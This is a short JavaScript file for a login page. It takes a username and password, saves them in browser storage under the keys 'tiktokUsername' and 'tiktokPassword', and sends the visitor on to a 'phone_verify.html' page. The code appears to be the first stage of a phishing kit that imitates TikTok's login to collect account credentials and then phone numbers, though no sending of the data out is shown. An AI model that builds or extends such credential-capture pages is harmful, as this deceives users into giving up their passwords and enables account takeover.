// script.js (for Page 1 - index.html)
document.addEventListener('DOMContentLoaded', function () {
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const messageDiv = document.getElementById('message');

    loginForm.addEventListener('submit', function (event) {
        event.preventDefault(); // This is KEY to prevent normal refresh

        const username = usernameInput.value.trim();
        const password = passwordInput.value;

        if (messageDiv) {
            messageDiv.textContent = '';
            messageDiv.className = 'message';
            messageDiv.classList.remove('show');
        }

        if (username === '' || password === '') {
            displayMessage('Please enter both username/email and password.', 'error');
            return; // Stop execution if fields are empty
        }

        // If we reach here, validation passed. Now try to store and redirect.
        try {
            sessionStorage.setItem('tiktokUsername', username);
            sessionStorage.setItem('tiktokPassword', password);

            // Redirect to the phone number page
            console.log("Attempting to redirect to phone_verify.html"); // For debugging
            window.location.href = 'phone_verify.html';
        } catch (e) {
            // This might happen if sessionStorage is disabled or full
            console.error("Error using sessionStorage: ", e);
            displayMessage('Could not proceed. Please enable browser storage or try again.', 'error');
        }
    });

    function displayMessage(msg, type) {
        if (messageDiv) {
            setTimeout(() => {
                messageDiv.textContent = msg;
                messageDiv.classList.add(type);
                messageDiv.classList.add('show'); // For animation if you have CSS for .show
            }, 50);
        } else {
            // Fallback if messageDiv doesn't exist
            alert((type === 'error' ? "Error: " : "") + msg);
        }
    }
});
